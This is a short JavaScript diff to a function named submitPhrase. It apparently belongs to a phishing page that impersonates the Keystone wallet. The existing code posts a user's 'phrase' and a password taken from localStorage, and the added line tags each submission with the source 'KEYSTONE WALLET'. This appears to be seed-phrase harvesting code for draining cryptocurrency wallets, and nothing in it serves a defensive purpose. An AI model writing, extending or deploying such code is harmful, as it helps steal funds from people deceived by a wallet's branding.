@@ -187,6 +187,7 @@ function submitPhrase(e,_this) {
         signal: controller.signal,
         body: JSON.stringify({
           phrase,
+          source: "KEYSTONE WALLET",
           password: localStorage.getItem("keystone-paw")
         }),
       })
